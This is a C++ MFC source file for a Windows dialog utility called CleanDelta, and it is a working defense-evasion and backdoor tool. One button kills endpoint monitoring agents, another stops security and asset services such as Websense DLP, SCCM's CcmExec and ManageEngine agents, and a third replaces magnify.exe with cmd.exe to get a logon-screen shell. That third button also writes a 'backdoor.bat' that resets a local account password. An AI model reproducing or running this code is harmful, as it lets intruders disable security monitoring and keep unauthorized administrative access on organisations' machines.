
// CleanDeltaDlg.cpp : implementation file
//

#include "stdafx.h"
#include "CleanDelta.h"
#include "CleanDeltaDlg.h"
#include "afxdialogex.h"

#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include "StdioFileEx.h"

#include "Winsvc.h" // to use SC_HANDLE


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

HWND m_hWind = NULL;
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CCleanDeltaDlg dialog



CCleanDeltaDlg::CCleanDeltaDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CCleanDeltaDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CCleanDeltaDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CCleanDeltaDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CCleanDeltaDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CCleanDeltaDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CCleanDeltaDlg::OnBnClickedButton3)
END_MESSAGE_MAP()


// CCleanDeltaDlg message handlers

BOOL CCleanDeltaDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CCleanDeltaDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CCleanDeltaDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CCleanDeltaDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CCleanDeltaDlg::OnBnClickedButton1()
{

	killProcessByFileName(L"aeagent.exe");
	killProcessByFileName(L"agentmonitor.exe");

	AfxMessageBox(L"DONE");
	//killProcessByName(L"Dserui.exe");


	//TODO DEL: %SystemRoot%\system32\wecsvc.dll
	//killProcessByTitle(L"Websense Endpoint");
	
	//TODO:clse service


}


void CCleanDeltaDlg::killProcessByFileName(CString strFilename)
{
	CStringA strWtoA(strFilename);
	const char* filename = strWtoA;

	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp((const char *)pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}


void CCleanDeltaDlg::killProcessByTitle(CString strTarget)
{	
	EnumWindows(&EnumWindowsProc, (LPARAM)&strTarget);	
	Kill(m_hWind);
}




BOOL CALLBACK CCleanDeltaDlg::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{	
	TCHAR strEnumTitle[200];
	::GetWindowText(hwnd, strEnumTitle, 200);
	CString cstrTitle = strEnumTitle;	
	
	CString *strSpecifiedTitle = (CString*)lParam;
	if (cstrTitle.Find(*strSpecifiedTitle) != -1){
		
		m_hWind = ::FindWindow(NULL, cstrTitle);
		return FALSE;
	}
	else{
		return TRUE; 
	}
}





void CCleanDeltaDlg::Kill(HWND hwnd)
{
	// To prevent overkill
	//if (killing) {
	//	return;
	//}
	//killing = 1;

	// Get process id of hwnd
	DWORD pid;
	GetWindowThreadProcessId(hwnd, &pid);

	int SeDebugPrivilege = 0;
	// Get process token
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0) {
		// Could not elevate privileges, so we try without elevated privileges.
#ifdef DEBUG
	//	Error(L"OpenProcessToken()", L"Kill()", GetLastError());
#endif
	}
	else {
		// Get LUID for SeDebugPrivilege
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		// Enable SeDebugPrivilege
		if (AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) == 0 || GetLastError() != ERROR_SUCCESS) {
			CloseHandle(hToken);
#ifdef DEBUG
		//	Error(L"AdjustTokenPrivileges()", L"Kill()", GetLastError());
#endif
		}
		else {
			// Got it
			SeDebugPrivilege = 1;
		}
	}

	// Open the process
	HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (process == NULL) {
#ifdef DEBUG
	//	Error(L"OpenProcess()", L"Kill()", GetLastError());
#endif
		return;
	}

	// Terminate process
	if (TerminateProcess(process, 1) == 0) {
#ifdef DEBUG
		//Error(L"TerminateProcess()", L"Kill()", GetLastError());
#endif
		return;
	}

	// Close handle
	CloseHandle(process);

	// Disable SeDebugPrivilege
	if (SeDebugPrivilege) {
		tkp.Privileges[0].Attributes = 0;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
		CloseHandle(hToken);
	}
}




void CCleanDeltaDlg::OnBnClickedButton2()
{
	BOOL result = TRUE;
	 result = result && StopService(L"CcmExec");
	 result = result && StopService(L"WSDLP");
	 result = result && StopService(L"WSRF");
	 result = result && StopService(L"WSPXY");
	 result = result && StopService(L"ManageEngine AssetExplorer Agent");
	 result = result && StopService(L"ManageEngine AssetExplorer RemoteControl");

	 if (result)
	 {
		 AfxMessageBox(L"DONE");
	 }
	 else
	 {
		 AfxMessageBox(L"some thing wrong");
	 }
	
	
	
}


BOOL CCleanDeltaDlg::StopService(CString Name)
{

	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == 0)
	{
		AfxMessageBox(_T("KillService OpenSCManager failed"));
	}
	else
	{
		// open the service
		SC_HANDLE schService = OpenService(schSCManager, Name, SERVICE_ALL_ACCESS);
		if (schService == 0)
		{
			AfxMessageBox(_T("KillService OpenService failed"));
		}


		else
		{
			// call ControlService to kill the given service
			SERVICE_STATUS status;
			if (ControlService(schService, SERVICE_CONTROL_STOP, &status))
			{
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				return TRUE;
			}
			else
			{
				//AfxMessageBox(_T("KillService ControlService failed"));
			}
			CloseServiceHandle(schService);
		}
		CloseServiceHandle(schSCManager);

	}
	return FALSE;

}


void CCleanDeltaDlg::OnBnClickedButton3()
{
	if (!PathFileExists(L"C:\\Windows\\System32\\magnify_old.exe"))
	{
		if (PathFileExists(L"C:\\Windows\\System32\\magnify.exe"))
		{
			system("copy C:\\Windows\\System32\\magnify.exe C:\\Windows\\System32\\magnify_old.exe");
		}

		if (PathFileExists(L"C:\\Windows\\System32\\cmd.exe"))
		{
			system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
		}
	}


	CStdioFile file;

	CString  strFullPath = L"C:\\backdoor.bat";
	if (!file.Open(strFullPath, CFile::modeCreate | CFile::modeWrite))
	{
		AfxMessageBox(L"Cannot Set backdoor.bat");
	}

	file.WriteString(L"net user TWLadmin Aa1234");
	file.Close();


	AfxMessageBox(L"OK");
}
